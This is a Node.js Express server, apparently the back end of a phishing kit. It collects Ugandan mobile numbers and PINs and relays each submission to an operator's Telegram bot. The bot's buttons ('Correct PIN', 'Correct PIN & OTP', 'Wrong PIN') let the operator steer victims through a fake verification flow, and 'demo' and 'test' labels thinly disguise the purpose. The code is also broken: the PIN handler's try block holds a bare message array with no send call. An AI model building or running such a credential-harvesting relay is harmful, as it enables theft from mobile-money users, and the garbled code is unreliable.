const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

app.get("/", (_req, res) => {
  res.sendFile(INDEX_FILE, err => {
    if (err && !res.headersSent) res.status(404).send("Not found.");
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const requests = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, data] of requests.entries()) {
    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
      requests.delete(id);
    }
  }
}, 5 * 60 * 1000);

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
  
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  
  const data = await res.json();
  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
  return data;
}

app.post("/api/phone", (req, res) => {
  const phone = String(req.body.phone || "").trim();
  
  // ✅ FIXED: Removed the erroneous backslash character completely
  if (!/^\+2567\d{8}$/.test(phone)) {
    return res.status(400).json({ error: "Invalid format phone number." });
  }
  
  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
  requests.set(item.id, item);
  return res.json({ id: item.id, status: item.status });
});

app.post("/api/pin-demo", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);
  if (!request) return res.status(400).json({ error: "Session expired or missing." });
  
  request.pin = String(req.body.pin || "").trim();
  request.status = "pending";
  
  const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
  
     try { 
  "# Thor - PIN Verification",
  "TEST VERIFICATION NEEDED\n",
  "USER DETAILS:",
  `• Phone Number: ${request.phone}`,
  `• User ID: ${request.id}`,
  `• Time: ${timeString}`,
  "• Bot: user178",
  "",
  "━━━━━━━━━━━━━━━━━━━━",
  "",
  "Verify the test submission:",
  "• Mode: Demo verification",
  "• Timeout: 5 minutes",
  "",
  "━━━━━━━━━━━━━━━━━━━━",
  "",
  "⏳ AWAITING VERIFICATION", 
].join("\n"),

reply_markup: {
  inline_keyboard: [
    [
      { text: "✅ Correct PIN", callback_data: `approve:${request.id}` }
    ],
    [
      { text: "Correct PIN & OTP", callback_data: `extend:${request.id}` },
      { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
    ],
    [
      { text: "⏱ Extend Time", callback_data: `extend:${request.id}` }
    ]
  ]
}
  
    });
    return res.json({ status: "pending" });
  } catch (err) {
    console.error("TELEGRAM ERROR:", err.message);
    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
  }

});

app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);
  if (!request) return res.status(404).json({ error: "Not found." });
  return res.json({ status: request.status, stage: request.stage });
});

app.post("/api/retry", (req, res) => {
  const request = requests.get(String(req.body.id || ""));
  if (request && request.status === "declined") {
    request.status = "ready";
    return res.json({ status: request.status });
  }
  return res.status(400).json({ error: "Error resetting layout." });
});

let offset = 0;
async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  while (true) {
    try {
      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
      for (const upd of data.result || []) {
        offset = upd.update_id + 1;
        const cb = upd.callback_query;
        if (!cb) continue;
        
        const parts = String(cb.data || "").split(":");
        const action = parts[0]; 
        const reqId = parts.slice(1).join(":");
        const request = requests.get(reqId);
        
        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
          if (action === "approve") {
            request.status = "approved";
          } else if (action === "decline") {
            request.status = "declined";
          }
          
          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
          
          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
          await telegram("sendMessage", {
            chat_id: CHAT_ID,
            text: `${statusMarker} processed for Phone: ${request.phone}`
          });
        }
      }
    } catch (err) {
      await new Promise(r => setTimeout(r, 4000));
    }
  }
}

pollTelegram();
app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
